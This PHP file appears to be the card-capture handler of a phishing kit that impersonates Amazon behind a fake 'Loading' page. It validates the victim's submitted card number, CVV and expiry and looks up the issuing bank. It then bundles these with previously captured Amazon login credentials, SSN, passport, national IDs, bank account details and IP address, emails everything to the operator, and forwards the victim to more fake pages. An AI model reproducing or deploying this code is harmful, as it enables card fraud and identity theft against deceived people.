<?php 
 require_once(dirname(dirname(dirname(__DIR__))).'/autoloader.php');
$bin = $core->post('nomartu');
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);

echo '<title>Amazon - Loading ... </title>';

echo '<center><br><br><br><br><img src="../../aws/img/gif/loading-4x._V1_.gif" style="margin-top:20%"></center>';

  if($core->parse_hijaiyh('sp','3dsecure') == 1)
   {
       $kemana = 'verified';
   }else{
       if($core->parse_hijaiyh('sp','bank') == 1)
       {
           $kemana = 'bank';
       }else{
           if($core->parse_hijaiyh('sp','email_login') == 1)
           {
               $kemana = 'email';
           }else{
               $kemana = 'finish';
           }
       }
   }


if(isset($_POST))
{
    $check = ['nomartu','cVv','carlder','onth','ear'];
    if($core->empty_post_array($check) || $core->post('onth') == '--' || $core->post('ear') == '--')
    {$core->stats('card-empty','Card invalid, user going to card page.');
        $core->redirect('../../ap/card?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
        
          exit;
    }
    
    $cardNumb = str_replace(" ", "", $core->post('nomartu'));
    $ccType = CreditCard::creditCardType($cardNumb);
    $checkCard = CreditCard::validCreditCard($cardNumb);
    $checkCvv = CreditCard::validCvc($core->post('cVv'),$ccType);
    $checkExp = CreditCard::validDate($core->post('ear'),$core->post('onth'));
    
    if(!$checkCard['valid'])
    { $core->stats('card-invalid',$cardNumb.' => is invalid card number, user going to card page');
        $core->redirect('../../ap/card?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
       
          exit;
    }elseif(!$checkCvv){
        $core->stats('cvv-invalid',$core->post('cVv').' => cvv ( security code ) invalid , user going to card page');
        $core->redirect('../../ap/card?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
          exit;
    }elseif(!$checkExp)
    {
        $core->stats('expdate-invalid','Expired date invalid, user going to card page');
        $core->redirect('../../ap/card?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
          exit;
    }

    $num = $core->post('nomartu');
    $num = preg_replace('/\s/', '', $num);
    $num = substr($num,0,6);

   $bin = $api->bin($num);
    
  /*  $day = $core->post('dobd');
  $month = $core->post('dobm');
  $year = $core->post('doby');*/

    $data = ['username' => $core->session('username'),
            'password' => $core->session('password'),
            'fullname' => $core->session('fullname'),
     'address' => $core->session('address'),
     'city' => $core->session('city'),
     'state' => $core->session('state'),
     'postcode' => $core->session('postcode'),
     'country' => $core->session('country'),
     'phone' => $core->session('phone'),
 

            'birthday' => $core->session('birthday'),
             
            'bank' => $xBIN["bank"]["name"],
            'brandtype' => "".strtoupper($xBIN["scheme"])." - ".strtoupper($xBIN["type"])."",
            'levelcountry' => "".strtoupper($xBIN["brand"])."",
            'cardholder' => $core->post('carlder'),
            'cardnumber' => $core->post('nomartu'),
            'cid' => $core->post('cid'),
            'expired' => $core->post('onth').'/'.$core->post('ear'),
            'cvv' => $core->post('cVv'),
            'copy' => str_replace(" ","",trim($core->post('nomartu')))."|".$core->post('onth')."|".$core->post('ear')."|".$core->post('cVv'),
            
            'ssn' => $core->session('ssn'),
            'qatarid' => $core->session('qatarid'),
            'idnumber' => $core->session('idnumber'),
            'citizenid' => $core->session('citizenid'),
            'nationalid' => $core->session('nationalid'),
            'sortcode' => $core->session('sortcode'),
            'passport' => $core->session('passport'),
            'civilid' => $core->session('civilid'),
            'ban' => $core->session('ban'),
            'accno' => $core->session('accno'),
            'climit' => $core->session('climit'),
            'bankaccount' => $core->session('bankaccount'),
            'nabid' => $core->session('nabid'),
            'cardid' => $core->session('cardid'),
            'cardpass' => $core->session('cardpass'),
            
            'useragent' => $_SERVER['HTTP_USER_AGENT'] ,
            'ip' => $core->userIP() , 
            'country' => $country_name , 
            'date' => date('D,d m Y H:i')
            ];

if(isset($_SESSION['cardnumber']))
{
  if($_SESSION['cardnumber'] == $core->post('nomartu'))
  {
        $core->redirect('../../ap/'.$kemana.'?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
    exit;
  }
}
    
    $sendMsg = $core->parse_result('card',$data);
    $info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();
    
    $sendSubj = "[H] [$num] ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["brand"])." ".strtoupper($xBIN["bank"]["name"])."  // ".$info;
    
    $justbin = "[H] [$num] ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["brand"])." ".strtoupper($xBIN["bank"]["name"])."";
    $core->stats('ccs',$justbin);
    file_put_contents(dirname(dirname(__DIR__)).'/stats/bins.txt',$justbin."\n",FILE_APPEND);
    $sendFrom = $core->post('carlder');
    $core->sendmail($email_result,$sendFrom,$sendSubj,$sendMsg);
    $core->create_session($data);
    
    $core->redirect('../../ap/'.$kemana.'?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);

  }

 ?>